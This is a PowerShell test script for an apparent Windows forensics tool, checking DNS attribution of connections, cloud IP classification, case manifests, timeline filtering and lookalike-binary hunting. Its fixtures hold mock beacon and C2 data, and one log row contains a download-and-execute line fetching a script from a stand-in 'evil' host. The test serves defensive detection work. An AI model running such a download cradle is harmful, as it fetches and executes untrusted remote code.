# test_v282.ps1 - v2.82: DNS connection attribution + classifier fills + CI manifest fix +
#                  supertimeline cmdletization filter
# Part 1: Get-IpCloudClass Azure fills (4.208/12, 13.64/11, 13.96/13) + existing rules.
# Part 2: Get-DomainProvider suffix classification (microsoft/amazon/google/cloudflare/
#         akamai, subdomains, unknown -> '').
# Part 3: New-ConnectionDns - A/AAAA/CNAME join, CNAME chain walk (alias -> target -> A),
#         provider from domain suffix when IP range misses, 'unknown' when nothing resolves,
#         dedupe of the two public-connection sources, Save-Rows output shape.
# Part 4: New-CaseManifest - ForDir canonicalization (non-canonical casing on input must
#         still yield plain 'evidence.csv' rows) + SCRIPT self line + row format.
# Part 5: New-SuperTimeline drops EID 4104 __cmdletization boilerplate rows.
$ErrorActionPreference = 'Stop'
$repoScript = Join-Path (Split-Path -Parent $PSScriptRoot) 'Ophira.ps1'
$src = Get-Content -LiteralPath $repoScript -Raw

$pass = 0; $fail = 0
function Check([string]$label, [bool]$ok) {
    if ($ok) { $script:pass++; Write-Host "  [ok] $label" -ForegroundColor Green }
    else { $script:fail++; Write-Host "  [FAIL] $label" -ForegroundColor Red }
}
$stamp = Get-Date -Format 'HHmmss'

# ---- extract the real functions ----
$defs = ''
foreach ($n in @('Get-IpCloudClass', 'Get-DomainProvider', 'New-ConnectionDns', 'New-CaseManifest', 'New-SuperTimeline', 'Get-InvariantDate')) {
    $m = [regex]::Match($src, "(?s)function $n \{.*?\r?\n\}")
    if (-not $m.Success) { throw "extract failed: $n" }
    $defs += $m.Value + "`r`n"
}
Invoke-Expression $defs
$ScriptVersion = '9.99'

function Write-CaseLog { param([string]$Message, [string]$Color = 'Gray') }
function QuietLog { param($Message) }

# ============================================================================
# PART 1 - Get-IpCloudClass Azure fills
# ============================================================================
Check "ipclass: 4.213.25.242 (Azure 4.208/12) -> microsoft" ((Get-IpCloudClass '4.213.25.242') -eq 'microsoft')
Check "ipclass: 4.208.0.1 (lower /12 edge) -> microsoft" ((Get-IpCloudClass '4.208.0.1') -eq 'microsoft')
Check "ipclass: 4.223.255.254 (upper /12 edge) -> microsoft" ((Get-IpCloudClass '4.223.255.254') -eq 'microsoft')
Check "ipclass: 4.207.0.1 (below /12) -> ''" ((Get-IpCloudClass '4.207.0.1') -eq '')
Check "ipclass: 4.224.0.1 (above /12) -> ''" ((Get-IpCloudClass '4.224.0.1') -eq '')
Check "ipclass: 13.70.1.1 (13.64/11 fill) -> microsoft" ((Get-IpCloudClass '13.70.1.1') -eq 'microsoft')
Check "ipclass: 13.96.5.5 (13.96/13 fill) -> microsoft" ((Get-IpCloudClass '13.96.5.5') -eq 'microsoft')
Check "ipclass: 13.107.108.1 (existing rule) -> microsoft" ((Get-IpCloudClass '13.107.108.1') -eq 'microsoft')
Check "ipclass: 48.209.109.33 (existing rule) -> microsoft" ((Get-IpCloudClass '48.209.109.33') -eq 'microsoft')
Check "ipclass: 104.20.32.17 -> cloudflare" ((Get-IpCloudClass '104.20.32.17') -eq 'cloudflare')
Check "ipclass: 202.50.253.27 (non-cloud) -> ''" ((Get-IpCloudClass '202.50.253.27') -eq '')
Check "ipclass: garbage -> ''" ((Get-IpCloudClass 'not-an-ip') -eq '')

# ============================================================================
# PART 2 - Get-DomainProvider
# ============================================================================
Check "domprov: microsoft.com -> microsoft" ((Get-DomainProvider 'settings-win.data.microsoft.com') -eq 'microsoft')
Check "domprov: windowsupdate.com -> microsoft" ((Get-DomainProvider 'fe2cr.update.microsoft.com') -eq 'microsoft')
Check "domprov: githubusercontent.com -> microsoft" ((Get-DomainProvider 'objects.githubusercontent.com') -eq 'microsoft')
Check "domprov: amazonaws.com -> amazon" ((Get-DomainProvider 'ec2-1-2-3-4.compute-1.amazonaws.com') -eq 'amazon')
Check "domprov: cloudfront.net -> amazon" ((Get-DomainProvider 'd111111abcdef8.cloudfront.net') -eq 'amazon')
Check "domprov: googleapis.com -> google" ((Get-DomainProvider 'www.googleapis.com') -eq 'google')
Check "domprov: cloudflareclient.com -> cloudflare" ((Get-DomainProvider 'vgtest.cloudflareclient.com') -eq 'cloudflare')
Check "domprov: akamaihd.net -> akamai" ((Get-DomainProvider 'a248.e.akamaihd.net') -eq 'akamai')
Check "domprov: bare suffix equals host -> matches" ((Get-DomainProvider 'microsoft.com') -eq 'microsoft')
Check "domprov: not-microsoft.com does NOT match microsoft.com" ((Get-DomainProvider 'not-microsoft.com') -eq '')
Check "domprov: evil.example.net -> ''" ((Get-DomainProvider 'evil.example.net') -eq '')
Check "domprov: empty -> ''" ((Get-DomainProvider '') -eq '')
Check "domprov: trailing dot trimmed" ((Get-DomainProvider 'x.azure.com.') -eq 'microsoft')

# ============================================================================
# PART 3 - New-ConnectionDns
# ============================================================================
$script:caseCsv = @{}
function Import-CaseCsv { param([string]$Name) $k = "$Name" -replace '\.csv$', ''; if ($script:caseCsv.ContainsKey($k)) { return $script:caseCsv[$k] }; return @() }
$script:saved = @{}
function Save-Rows { param([string]$Name, $Rows) $script:saved[$Name] = @($Rows) }

# dns_cache with numeric Type strings (Export-Csv stringifies the enum) + a CNAME chain:
# cdn.stage.evil-cdn.net -> CNAME -> evil.example-cdn.net -> CNAME -> d2x.cloudfront.net
# -> A 203.0.113.55 ; plus a plain A (104.20.32.17 -> www.stealth-c2.net) and an AAAA.
$script:caseCsv['flash_public_connections'] = @(
    [pscustomobject]@{ Proto = 'TCP'; LocalAddress = '10.0.0.5'; LocalPort = '50100'; RemoteAddress = '203.0.113.55'; RemotePort = '443'; State = 'Established'; PID = '1000'; ProcessPath = 'C:\evil\beacon.exe'; Public = 'True' }
    [pscustomobject]@{ Proto = 'TCP'; LocalAddress = '10.0.0.5'; LocalPort = '50101'; RemoteAddress = '104.20.32.17'; RemotePort = '443'; State = 'Established'; PID = '2000'; ProcessPath = 'C:\Windows\System32\svchost.exe'; Public = 'True' }
    [pscustomobject]@{ Proto = 'TCP'; LocalAddress = '10.0.0.5'; LocalPort = '50102'; RemoteAddress = '202.50.253.27'; RemotePort = '19999'; State = 'Established'; PID = '3000'; ProcessPath = 'C:\evil\xray.exe'; Public = 'True' }
)
# one DUPLICATE row via the second source (same ip|port|pid|path) + one genuinely extra row
$script:caseCsv['connections_public_established'] = @(
    [pscustomobject]@{ Proto = 'TCP'; LocalAddress = '10.0.0.5'; LocalPort = '50100'; RemoteAddress = '203.0.113.55'; RemotePort = '443'; State = 'Established'; PID = '1000'; ProcessPath = 'C:\evil\beacon.exe'; Public = 'True' }
    [pscustomobject]@{ Proto = 'TCP'; LocalAddress = '10.0.0.5'; LocalPort = '50103'; RemoteAddress = '4.213.25.242'; RemotePort = '443'; State = 'Established'; PID = '6440'; ProcessPath = 'C:\Windows\System32\svchost.exe'; Public = 'True' }
)
$script:caseCsv['dns_cache'] = @(
    [pscustomobject]@{ Entry = 'cdn.stage.evil-cdn.net'; Data = 'evil.example-cdn.net'; Type = '5'; TimeToLive = '55' }
    [pscustomobject]@{ Entry = 'evil.example-cdn.net'; Data = 'd2x.cloudfront.net'; Type = '5'; TimeToLive = '55' }
    [pscustomobject]@{ Entry = 'd2x.cloudfront.net'; Data = '203.0.113.55'; Type = '1'; TimeToLive = '55' }
    [pscustomobject]@{ Entry = 'www.stealth-c2.net'; Data = '104.20.32.17'; Type = '1'; TimeToLive = '30' }
    [pscustomobject]@{ Entry = 'v6.stealth-c2.net'; Data = '2606:4700::6814'; Type = '28'; TimeToLive = '30' }
    [pscustomobject]@{ Entry = 'localhost'; Data = '127.0.0.1'; Type = '1'; TimeToLive = '86400' }
)

New-ConnectionDns
$out = $script:saved['connections_dns']
Check "connDns: output csv saved with 4 unique connections" ($out.Count -eq 4)
$beacon = @($out | Where-Object { $_.RemoteAddress -eq '203.0.113.55' })[0]
Check "connDns: CNAME chain resolved to leftmost query name" ("$($beacon.ResolvedDomain)" -eq 'cdn.stage.evil-cdn.net')
Check "connDns: chain text walks alias -> target -> ip" ("$($beacon.DnsChain)" -eq 'cdn.stage.evil-cdn.net -> evil.example-cdn.net -> d2x.cloudfront.net -> 203.0.113.55')
Check "connDns: provider from domain suffix chain" ("$($beacon.Provider)" -eq 'amazon')
$stealth = @($out | Where-Object { $_.RemoteAddress -eq '104.20.32.17' })[0]
Check "connDns: plain A record resolves + keeps ip-range provider" ("$($stealth.ResolvedDomain)" -eq 'www.stealth-c2.net' -and "$($stealth.Provider)" -eq 'cloudflare')
$unres = @($out | Where-Object { $_.RemoteAddress -eq '202.50.253.27' })[0]
Check "connDns: no cache entry -> empty domain, unknown provider" ("$($unres.ResolvedDomain)" -eq '' -and "$($unres.Provider)" -eq 'unknown')
$azure = @($out | Where-Object { $_.RemoteAddress -eq '4.213.25.242' })[0]
Check "connDns: Azure ip keeps ip-range provider over missing dns" ("$($azure.Provider)" -eq 'microsoft')
Check "connDns: columns carry Process/PID/State" ("$($beacon.Process)" -eq 'beacon.exe' -and "$($beacon.PID)" -eq '1000' -and "$($beacon.State)" -eq 'Established')

# ============================================================================
# PART 4 - New-CaseManifest canonical ForDir
# ============================================================================
function Get-ToolsDir { return $null }
$mfDir = Join-Path $env:TEMP ("ophira_v282_$stamp\mfcase")
New-Item -ItemType Directory -Path $mfDir -Force | Out-Null
Set-Content -LiteralPath (Join-Path $mfDir 'evidence.csv') -Value 'a,b' -Encoding ASCII
# pass the dir with FLIPPED casing + a trailing dot - not the canonical name Get-ChildItem
# returns; the v2.82 fix canonicalizes first, the old code produced garbage relative paths
$twisted = "$mfDir.".Replace('OPHIRA', 'ophira').ToLower()
New-CaseManifest -ForDir $twisted -HeaderLines @('test manifest')
$mfLines = Get-Content -LiteralPath (Join-Path $mfDir 'manifest.txt')
$row = @($mfLines | Where-Object { $_ -match 'evidence\.csv\s+\d+\s+[0-9A-F]{64}$' })
Check "manifest: evidence.csv row is a clean relative path + sha" ($row.Count -eq 1)
Check "manifest: relative path is not mid-cut garbage" (-not (@($mfLines | Where-Object { $_ -match '\\evidence\.csv' }).Count))
Check "manifest: SCRIPT self line present" (@($mfLines | Where-Object { $_ -match '^SCRIPT: Ophira v9\.99' }).Count -eq 1)
Remove-Item -LiteralPath (Split-Path $mfDir -Parent) -Recurse -Force

# ============================================================================
# PART 5 - supertimeline cmdletization filter
# ============================================================================
$script:caseCsv = @{}
$script:caseCsv['powershell_events'] = @(
    [pscustomobject]@{ TimeCreated = '2026-10-27 10:00:00'; Id = '4104'; Message = 'Creating Scriptblock text (1 of 1): if (!$__cmdletization_break){ ... }' }
    [pscustomobject]@{ TimeCreated = '2026-10-27 10:01:00'; Id = '4104'; Message = 'Creating Scriptblock text (1 of 1): $__cmdletization_queryBinderTable...' }
    [pscustomobject]@{ TimeCreated = '2026-10-27 10:02:00'; Id = '4104'; Message = 'Creating Scriptblock text (1 of 1): IEX((New-Object Net.WebClient).DownloadString(''http://evil/x.ps1''))' }
)
function Get-CaseCsvPath { param([string]$Name) return "$Name.csv" }
function Get-CaseCsvFullPath { param([string]$Name) $p = Join-Path $env:TEMP "$Name.csv"; if (Test-Path2 -LiteralPath $p) { Remove-Item -LiteralPath $p -Force }; return $p }
function Test-Path2 { [CmdletBinding()] param([string]$LiteralPath) return [IO.File]::Exists($LiteralPath) }
function Test-Path { [CmdletBinding()] param([string]$LiteralPath, [string]$PathType) return $false }
function Get-FilteredEvents { return @() }
function Get-HayabusaExe { return $null }
function Invoke-NativeTool { param($Exe, $Args) return $null }

New-SuperTimeline
$tlPath = Join-Path $env:TEMP 'supertimeline.csv'
$tl = @(Import-Csv -LiteralPath $tlPath)
$psRows = @($tl | Where-Object { $_.Source -eq 'powershell_events' })
Check "supertimeline: cmdletization boilerplate dropped, real scriptblock kept" ($psRows.Count -eq 1)
Check "supertimeline: kept row is the IEX one" ("$($psRows[0].Detail)" -match 'DownloadString')

# ============================================================================
# PART 6 - R36 v2.82: deterministic signature probing (no CWD lottery)
# ============================================================================
foreach ($n in @('Get-LevenshteinDistance', 'Test-IsUserWritablePath', 'New-HuntFindings')) {
    $m = [regex]::Match($src, "(?s)function $n \{.*?\r?\n\}")
    if (-not $m.Success) { throw "extract failed: $n" }
    $defs = $m.Value + "`r`n"
    Invoke-Expression $defs
}
$script:sigByPath = @{ 'c:\windows\system32\lsaiso.exe' = [pscustomobject]@{ Status = 'Valid'; SignerCertificate = [pscustomobject]@{ Subject = 'CN=Microsoft Windows' } } }
function Get-AuthenticodeSignature { param([string]$LiteralPath) $k = "$LiteralPath".ToLower(); if ($script:sigByPath.ContainsKey($k)) { return $script:sigByPath[$k] }; return $null }
function Test-Path { [CmdletBinding()] param([string]$LiteralPath, [string]$PathType) return $script:sigByPath.ContainsKey("$LiteralPath".ToLower()) }

# run A: device-path amcache entry for a signed system binary -> normalized, probed, SKIPPED
$script:caseCsv = @{}
$script:caseCsv['amcache'] = @(
    [pscustomobject]@{ FullPath = '\DEVICE\HARDDISKVOLUME3\WINDOWS\SYSTEM32\LSAISO.EXE'; Name = 'LsaIso.exe' }
)
$script:saved = @{}
New-HuntFindings
$r36a = @($script:saved['hunt_findings'] | Where-Object { "$_" -match 'Lookalike' })
Check "R36: device-path signed system binary skipped (no finding)" ($r36a.Count -eq 0)

# run B: name-only match (no path in evidence) -> low report-only lead, CWD never consulted
$script:caseCsv['amcache'] = @(
    [pscustomobject]@{ ApplicationName = 'LsaIso.exe' }
)
$script:saved = @{}
Push-Location $env:TEMP
try { New-HuntFindings } finally { Pop-Location }
$r36b = @($script:saved['hunt_findings'] | Where-Object { "$_" -match 'Lookalike' })
Check "R36: name-only match emits exactly one finding" ($r36b.Count -eq 1)
Check "R36: name-only match is LOW (never high, no CWD probe)" (@($r36b | Where-Object { $_.Severity -eq 'low' }).Count -eq 1)
Check "R36: name-only evidence explains itself" ("$($r36b[0].Evidence)" -match 'name-only match')

# run C: absolute user-writable path, file missing -> still HIGH (unchanged v2.81 behavior)
$script:caseCsv['amcache'] = @(
    [pscustomobject]@{ FullPath = 'C:\Users\victim\Downloads\scvhost.exe' }
)
$script:saved = @{}
New-HuntFindings
$r36c = @($script:saved['hunt_findings'] | Where-Object { "$_" -match 'Lookalike' })
Check "R36: missing user-writable absolute path = HIGH" (@($r36c | Where-Object { $_.Severity -eq 'high' }).Count -eq 1)

# ============================================================================
Write-Host ""
if ($fail -eq 0) { Write-Host "v2.82: all $pass checks passed" -ForegroundColor Green; exit 0 }
Write-Host "v2.82: $pass passed, $fail FAILED" -ForegroundColor Red; exit 1
